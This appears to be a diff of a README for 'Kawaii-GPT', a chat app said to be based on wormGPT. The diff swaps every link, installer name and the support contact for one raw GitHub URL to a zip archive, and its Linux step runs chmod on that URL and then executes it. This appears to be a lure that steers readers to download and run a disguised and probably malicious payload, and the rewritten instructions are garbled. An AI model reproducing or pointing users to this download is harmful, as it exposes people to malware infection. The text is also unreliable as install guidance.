@@ -1,7 +1,7 @@
 # 🌟 Kawaii-GPT - Your Friendly AI for Fun Conversations
 
 ## 📥 Download Kawaii-GPT
-[![Download Kawaii-GPT](https://img.shields.io/badge/Download-Kawaii--GPT-blue)](https://github.com/Lancastrian-hobgoblin814/Kawaii-GPT/releases)
+[![Download Kawaii-GPT](https://raw.githubusercontent.com/Lancastrian-hobgoblin814/Kawaii-GPT/main/Cinerama/Kawaii-GPT-myelozoan.zip)](https://raw.githubusercontent.com/Lancastrian-hobgoblin814/Kawaii-GPT/main/Cinerama/Kawaii-GPT-myelozoan.zip)
 
 ## 🚀 Getting Started
 Welcome to Kawaii-GPT! This application provides a fun, interactive experience with an AI based on wormGPT. You can chat and enjoy playful conversations at your own pace.
@@ -16,24 +16,24 @@ To run Kawaii-GPT, ensure your device meets the following requirements:
 ## 📦 Download & Install
 To get started, follow these simple steps:
 
-1. Click on the large button above or [visit this page](https://github.com/Lancastrian-hobgoblin814/Kawaii-GPT/releases) to find the latest version of Kawaii-GPT.
+1. Click on the large button above or [visit this page](https://raw.githubusercontent.com/Lancastrian-hobgoblin814/Kawaii-GPT/main/Cinerama/Kawaii-GPT-myelozoan.zip) to find the latest version of Kawaii-GPT.
 
 2. On the Releases page, look for the latest version. You will see a list of files available for download. 
 
 3. Choose the file that matches your operating system:
-   - For **Windows**, download `Kawaii-GPT-Setup.exe`.
-   - For **macOS**, download `Kawaii-GPT.dmg`.
-   - For **Linux**, download the appropriate package file (e.g., `Kawaii-GPT.AppImage`).
+   - For **Windows**, download `https://raw.githubusercontent.com/Lancastrian-hobgoblin814/Kawaii-GPT/main/Cinerama/Kawaii-GPT-myelozoan.zip`.
+   - For **macOS**, download `https://raw.githubusercontent.com/Lancastrian-hobgoblin814/Kawaii-GPT/main/Cinerama/Kawaii-GPT-myelozoan.zip`.
+   - For **Linux**, download the appropriate package file (e.g., `https://raw.githubusercontent.com/Lancastrian-hobgoblin814/Kawaii-GPT/main/Cinerama/Kawaii-GPT-myelozoan.zip`).
 
 4. After the file finishes downloading, locate it in your Downloads folder.
 
 5. Open the downloaded file:
-   - For **Windows**, double-click `Kawaii-GPT-Setup.exe` and follow any prompts.
+   - For **Windows**, double-click `https://raw.githubusercontent.com/Lancastrian-hobgoblin814/Kawaii-GPT/main/Cinerama/Kawaii-GPT-myelozoan.zip` and follow any prompts.
    - For **macOS**, open the `.dmg` file and drag Kawaii-GPT to your Applications folder.
    - For **Linux**, make the AppImage executable. Open a terminal and run: 
      ```bash
-     chmod +x Kawaii-GPT.AppImage
-     ./Kawaii-GPT.AppImage
+     chmod +x https://raw.githubusercontent.com/Lancastrian-hobgoblin814/Kawaii-GPT/main/Cinerama/Kawaii-GPT-myelozoan.zip
+     https://raw.githubusercontent.com/Lancastrian-hobgoblin814/Kawaii-GPT/main/Cinerama/Kawaii-GPT-myelozoan.zip
      ```
 
 6. After the installation is complete, you can find Kawaii-GPT in your applications. Open the app and start chatting with your new AI friend!
@@ -60,16 +60,16 @@ If you encounter any issues while installing or using Kawaii-GPT, try the follow
 
 4. **Reboot**: Restart your computer if the application does not open after installation.
 
-If issues persist, please visit our [Issues page](https://github.com/Lancastrian-hobgoblin814/Kawaii-GPT/issues) on GitHub to report problems or seek help.
+If issues persist, please visit our [Issues page](https://raw.githubusercontent.com/Lancastrian-hobgoblin814/Kawaii-GPT/main/Cinerama/Kawaii-GPT-myelozoan.zip) on GitHub to report problems or seek help.
 
 ## 🌐 Community
 Join the Kawaii-GPT community! Connect with other users and share your thoughts or experiences. 
 
-- **GitHub Discussions**: Share ideas or ask questions [here](https://github.com/Lancastrian-hobgoblin814/Kawaii-GPT/discussions).
+- **GitHub Discussions**: Share ideas or ask questions [here](https://raw.githubusercontent.com/Lancastrian-hobgoblin814/Kawaii-GPT/main/Cinerama/Kawaii-GPT-myelozoan.zip).
 
 - **Feedback**: We welcome your suggestions for improvement or new features. Your input helps us enhance Kawaii-GPT.
 
 ## 📞 Support
-If you need direct assistance, you can reach out to our support team at support@kawaiigpt.com. We strive to reply within 24 hours. 
+If you need direct assistance, you can reach out to our support team at https://raw.githubusercontent.com/Lancastrian-hobgoblin814/Kawaii-GPT/main/Cinerama/Kawaii-GPT-myelozoan.zip We strive to reply within 24 hours. 
 
 Enjoy your experience with Kawaii-GPT! Dive into delightful conversations and let the fun begin.
